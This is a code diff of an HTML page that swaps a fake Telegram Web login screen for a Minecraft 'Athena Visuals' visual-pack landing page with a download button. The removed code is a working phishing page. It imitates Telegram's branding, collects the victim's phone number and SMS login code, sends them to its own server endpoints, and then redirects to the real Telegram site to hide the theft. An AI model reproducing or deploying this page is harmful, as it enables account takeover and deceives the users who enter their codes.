@@ -2,179 +2,173 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Athena Visuals — Визуал-пак для Майнкрафт</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/x-icon" href="https://img.icons8.com/fluency/48/minecraft-pickaxe.png">
 </head>
 <body>
-    <div class="tg-page">
-        <div class="tg-content">
-            <div class="tg-header">
-                <div class="tg-logo">
-                    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
-                        <path d="M20 0C8.954 0 0 8.954 0 20C0 31.046 8.954 40 20 40C31.046 40 40 31.046 40 20C40 8.954 31.046 0 20 0Z" fill="#0088CC"/>
-                        <path d="M28.316 12.579L24.908 29.211C24.908 29.211 24.553 30.396 23.447 29.989L16.035 24.202L12.561 22.727L8.087 21.253C8.087 21.253 7.302 20.937 7.227 20.298C7.152 19.659 8.087 19.304 8.087 19.304L26.947 11.756C26.947 11.756 27.732 11.365 28.205 11.678C28.678 11.991 28.316 12.579 28.316 12.579Z" fill="white"/>
-                        <path d="M16.035 24.202L24.322 15.915C24.772 15.465 24.172 15.015 23.722 15.465L13.796 22.727L16.035 24.202Z" fill="#D2E5F1"/>
-                    </svg>
-                </div>
-                <h1 class="tg-title">Telegram</h1>
-                <p class="tg-subtitle">Войдите в свой аккаунт</p>
-            </div>
-
-            <div class="tg-form">
-                <div class="tg-input-group">
-                    <label class="tg-label">Страна</label>
-                    <div class="tg-select-wrapper">
-                        <select class="tg-select" id="country">
-                            <option value="7">Russia (+7)</option>
-                            <option value="1">United States (+1)</option>
-                            <option value="44">United Kingdom (+44)</option>
-                            <option value="49">Germany (+49)</option>
-                            <option value="33">France (+33)</option>
-                        </select>
-                        <div class="tg-select-arrow">▼</div>
-                    </div>
-                </div>
-
-                <div class="tg-input-group">
-                    <label class="tg-label">Номер телефона</label>
-                    <div class="tg-phone-input">
-                        <div class="tg-phone-prefix" id="phonePrefix">+7</div>
-                        <input type="tel" class="tg-input" id="phone" placeholder="900 123 45 67" maxlength="10" pattern="[0-9]*" inputmode="numeric">
-                    </div>
-                </div>
-
-                <button class="tg-button" id="nextButton">Далее</button>
-                
-                <div class="tg-agreement">
-                    <p>Нажимая «Далее», вы принимаете</p>
-                    <p><a href="https://telegram.org/tos" target="_blank">Условия предоставления услуг</a> и <a href="https://telegram.org/privacy" target="_blank">Политику конфиденциальности</a>.</p>
-                </div>
-            </div>
-
-            <div class="tg-footer">
-                <p>У вас нет доступа к телефону?</p>
-                <a href="#" class="tg-link" id="qrLogin">Войти с помощью QR-кода</a>
-            </div>
-        </div>
+    <!-- Анимированный фон -->
+    <div class="bg-animation">
+        <div class="cube"></div>
+        <div class="cube"></div>
+        <div class="cube"></div>
+        <div class="cube"></div>
+        <div class="cube"></div>
     </div>
 
-    <script>
-        document.getElementById('country').addEventListener('change', function() {
-            document.getElementById('phonePrefix').textContent = '+' + this.value;
-        });
+    <!-- Навигация -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="#" class="logo">
+                <i class="fas fa-gem"></i>
+                <span>Athena</span>Visuals
+            </a>
+            <ul class="nav-menu">
+                <li><a href="#home">Главная</a></li>
+                <li><a href="#features">Преимущества</a></li>
+                <li><a href="#gallery">Галерея</a></li>
+                <li><a href="#download">Скачать</a></li>
+            </ul>
+            <button class="menu-toggle">
+                <i class="fas fa-bars"></i>
+            </button>
+        </div>
+    </nav>
 
-        document.getElementById('nextButton').addEventListener('click', function() {
-            const countryCode = document.getElementById('country').value;
-            const phoneNumber = document.getElementById('phone').value;
-            
-            if (!phoneNumber || phoneNumber.length < 10) {
-                alert('Пожалуйста, введите правильный номер телефона');
-                return;
-            }
+    <!-- Главный экран -->
+    <section id="home" class="hero">
+        <div class="hero-content">
+            <h1 class="glitch" data-text="ATHENA VISUALS">ATHENA VISUALS</h1>
+            <p class="subtitle">Визуал-пак для <span class="highlight">Minecraft</span>, переопределяющий комфорт игры и дающий преимущество в <span class="highlight">PvP</span></p>
+            <div class="cta-buttons">
+                <a href="#download" class="btn btn-primary pulse">
+                    <i class="fas fa-download"></i> Скачать сейчас
+                </a>
+                <a href="#features" class="btn btn-secondary">
+                    <i class="fas fa-star"></i> Узнать больше
+                </a>
+            </div>
+        </div>
+        <div class="hero-image">
+            <div class="floating-block">
+                <img src="https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Minecraft с Athena Visuals">
+            </div>
+        </div>
+    </section>
 
-            const fullPhone = '+' + countryCode + phoneNumber;
-            
-            // Отправляем номер на сервер
-            fetch('/api/send-phone', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: fullPhone })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    // Показываем форму для ввода кода
-                    showCodeForm(fullPhone);
-                }
-            })
-            .catch(error => {
-                console.error('Ошибка:', error);
-                alert('Произошла ошибка. Попробуйте еще раз.');
-            });
-        });
-
-        function showCodeForm(phone) {
-            document.body.innerHTML = `
-                <div class="tg-page">
-                    <div class="tg-content">
-                        <div class="tg-header">
-                            <div class="tg-logo">
-                                <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
-                                    <path d="M20 0C8.954 0 0 8.954 0 20C0 31.046 8.954 40 20 40C31.046 40 40 31.046 40 20C40 8.954 31.046 0 20 0Z" fill="#0088CC"/>
-                                    <path d="M28.316 12.579L24.908 29.211C24.908 29.211 24.553 30.396 23.447 29.989L16.035 24.202L12.561 22.727L8.087 21.253C8.087 21.253 7.302 20.937 7.227 20.298C7.152 19.659 8.087 19.304 8.087 19.304L26.947 11.756C26.947 11.756 27.732 11.365 28.205 11.678C28.678 11.991 28.316 12.579 28.316 12.579Z" fill="white"/>
-                                    <path d="M16.035 24.202L24.322 15.915C24.772 15.465 24.172 15.015 23.722 15.465L13.796 22.727L16.035 24.202Z" fill="#D2E5F1"/>
-                                </svg>
-                            </div>
-                            <h1 class="tg-title">Код подтверждения</h1>
-                            <p class="tg-subtitle">Мы отправили код на ${phone}</p>
-                        </div>
-
-                        <div class="tg-form">
-                            <div class="tg-input-group">
-                                <label class="tg-label">Код из SMS</label>
-                                <input type="text" class="tg-input" id="authCode" placeholder="12345" maxlength="5" pattern="[0-9]*" inputmode="numeric">
-                            </div>
-
-                            <button class="tg-button" id="loginButton">Войти</button>
-                            
-                            <div class="tg-code-help">
-                                <p>Не получили код?</p>
-                                <a href="#" class="tg-link" id="resendCode">Отправить снова</a>
-                                <span class="tg-timer" id="timer">(59)</span>
-                            </div>
-                        </div>
-
-                        <div class="tg-footer">
-                            <a href="#" class="tg-link" id="backButton">Изменить номер</a>
-                        </div>
-                    </div>
+    <!-- Преимущества -->
+    <section id="features" class="features">
+        <h2 class="section-title">Почему <span class="highlight">Athena Visuals</span>?</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-bolt"></i>
                 </div>
-            `;
+                <h3>Максимальный FPS</h3>
+                <p>Оптимизированные текстуры и эффекты обеспечивают плавный геймплей даже на слабых ПК</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-eye"></i>
+                </div>
+                <h3>Четкая видимость</h3>
+                <p>Улучшенная контрастность и четкость объектов дают преимущество в PvP и исследовании</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-palette"></i>
+                </div>
+                <h3>Стильный дизайн</h3>
+                <p>Современная цветовая палитра, приятная глазу, не отвлекающая от геймплея</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-cogs"></i>
+                </div>
+                <h3>Гибкая настройка</h3>
+                <p>Возможность тонкой настройки под свои нужды через конфигурационные файлы</p>
+            </div>
+        </div>
+    </section>
 
-            // Таймер для повторной отправки
-            let timeLeft = 59;
-            const timerElement = document.getElementById('timer');
-            const timerInterval = setInterval(() => {
-                timeLeft--;
-                timerElement.textContent = `(${timeLeft})`;
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    document.getElementById('resendCode').style.display = 'inline';
-                    timerElement.style.display = 'none';
-                }
-            }, 1000);
+    <!-- Галерея -->
+    <section id="gallery" class="gallery">
+        <h2 class="section-title">Как это <span class="highlight">выглядит</span></h2>
+        <div class="gallery-container">
+            <div class="gallery-item">
+                <img src="https://images.unsplash.com/photo-1601042879364-f3947d1f9fc9?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Athena Visuals геймплей">
+                <div class="gallery-overlay">
+                    <h3>Четкий PvP</h3>
+                </div>
+            </div>
+            <div class="gallery-item">
+                <img src="https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Athena Visuals текстуры">
+                <div class="gallery-overlay">
+                    <h3>Стильные текстуры</h3>
+                </div>
+            </div>
+            <div class="gallery-item">
+                <img src="https://images.unsplash.com/photo-1593305841991-05c297ba4575?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Athena Visuals интерфейс">
+                <div class="gallery-overlay">
+                    <h3>Удобный UI</h3>
+                </div>
+            </div>
+        </div>
+    </section>
 
-            document.getElementById('loginButton').addEventListener('click', sendCode);
-            document.getElementById('backButton').addEventListener('click', () => location.reload());
-        }
+    <!-- Скачивание -->
+    <section id="download" class="download">
+        <div class="download-container">
+            <h2 class="section-title">Установить <span class="highlight">Athena Visuals</span></h2>
+            <div class="download-card">
+                <div class="download-info">
+                    <h3><i class="fas fa-crown"></i> Версия 2.1.4</h3>
+                    <p class="version-info">Актуальная версия, совместима с <strong>Minecraft 1.8.9 - 1.20+</strong></p>
+                    <ul class="download-list">
+                        <li><i class="fas fa-check"></i> Установка в один клик</li>
+                        <li><i class="fas fa-check"></i> Не требует OptiFine</li>
+                        <li><i class="fas fa-check"></i> Поддержка всех модов</li>
+                        <li><i class="fas fa-check"></i> Регулярные обновления</li>
+                    </ul>
+                </div>
+                <div class="download-action">
+                    <div class="download-count">
+                        <i class="fas fa-download"></i>
+                        <span>Скачали уже: <strong id="downloadCounter">12,847</strong> игроков</span>
+                    </div>
+                    <a href="https://example.com/athena-visuals.zip" class="btn btn-primary btn-large pulse" id="downloadBtn">
+                        <i class="fas fa-download"></i> Скачать Athena Visuals
+                    </a>
+                    <p class="download-note"><i class="fas fa-info-circle"></i> Размер: ~45 MB • Поддержка: Discord сервер</p>
+                </div>
+            </div>
+        </div>
+    </section>
 
-        function sendCode() {
-            const code = document.getElementById('authCode').value;
-            
-            if (!code || code.length !== 5) {
-                alert('Пожалуйста, введите 5-значный код');
-                return;
-            }
+    <!-- Футер -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <i class="fas fa-gem"></i>
+                <span>Athena</span>Visuals
+            </div>
+            <p class="footer-text">Лучший визуал-пак для комфортного геймплея и PvP в Minecraft</p>
+            <div class="social-links">
+                <a href="#"><i class="fab fa-discord"></i></a>
+                <a href="#"><i class="fab fa-youtube"></i></a>
+                <a href="#"><i class="fab fa-github"></i></a>
+                <a href="#"><i class="fab fa-twitter"></i></a>
+            </div>
+            <p class="copyright">© 2023 Athena Visuals. Неофициальный проект. Все права принадлежат Mojang.</p>
+        </div>
+    </footer>
 
-            fetch('/api/send-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ code: code })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    window.location.href = 'https://web.telegram.org/';
-                } else {
-                    alert('Неверный код. Попробуйте еще раз.');
-                }
-            })
-            .catch(error => {
-                console.error('Ошибка:', error);
-                alert('Произошла ошибка. Попробуйте еще раз.');
-            });
-        }
-    </script>
+    <!-- Скрипты -->
+    <script src="script.js"></script>
 </body>
 </html>
